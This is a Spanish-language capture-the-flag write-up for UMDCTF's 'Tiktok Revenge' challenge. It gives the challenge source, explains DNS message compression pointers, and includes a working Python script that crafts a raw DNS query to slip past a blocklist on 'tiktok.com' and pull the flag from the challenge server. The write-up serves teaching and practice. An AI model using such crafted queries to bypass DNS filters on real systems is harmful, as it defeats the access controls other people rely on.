# Tiktok Revenge

Codigo fuente:
```python
#!/usr/local/bin/python -u

import subprocess
import sys
import socket

from flag import flag

dns_ip_addr = "127.0.0.1"
dns_port = 25565

subprocess.run(
        ['/app/dnsmasq',
         '-x', 'dnsmasq.pid',
         '-p', f'{dns_port}',
         '--txt-record', f'tiktok.com,{flag}'])

size = sys.stdin.buffer.read(4)
size = int.from_bytes(size)

req = sys.stdin.buffer.read(size)

if b'tiktok\x03com' in req.lower():
    print("Sorry, TikTok isn't available right now. A law banning TikTok has been enacted in the U.S. Unfortunately, that means you can't use TikTok for now. We are fortunate that President Trump has indicated that he will work with us on a solution to reinstate TikTok once he takes office. Please stay tuned!")
else:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(req, (dns_ip_addr, dns_port))
    resp = sock.recv(1024)
    print(resp)
```

Ahora la validacion es mas dura, para pasarla debemos hacer uso de los "punteros de compresion", una caracteristica de los servidores DNS para acortar consultas:

https://datatracker.ietf.org/doc/html/rfc1035 (Section 4.1.4. Message compression)

https://www.rfc-editor.org/rfc/rfc9267.html#name-null-terminator-placement-v

Basicamente al examinar una consulta si el servidor DNS encuentra un octeto con los dos primeros bits a \x01 los trata como un puntero:

```
The pointer takes the form of a two octet sequence:

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    | 1  1|                OFFSET                   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

El puntero salta a la posicion determinada por el offset consumiendo bytes hasta encontrar un \x00, entonces retorna a su posicion actual:

Exploit:
``` python
import socket
header = (
        b'\x12\x34'         # ID aleatorio
        b'\x01\x00'      # Flags (RD=1)
        b'\x00\x01'      # QCOUNT
        b'\x00\x00'      # ANCOUNT
        b'\x00\x00'      # NSCOUNT
        b'\x00\x00'      # ARCOUNT
        )
q = (
         b"\x06tiktok"
   ----- b"\xC0\x19"
   |     b"\x00\x10"      # tipo TXT
   |     b"\x00\x01"      # clase IN
   ----> b"\x03com\x00"
     )
wire = header + q

# Enviar consulta al servicio
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('challs.umdctf.io',32301))
    s.send(len(wire).to_bytes(4) + wire)
    response = s.recv(1024)

# Extraer la flag de la respuesta DNS
print("Request:", wire)
print("Response:",response.decode())
```

`UMDCTF{we_remembered_pointer_compression_but_forgor_about_case_insensitivity_:skull:}`






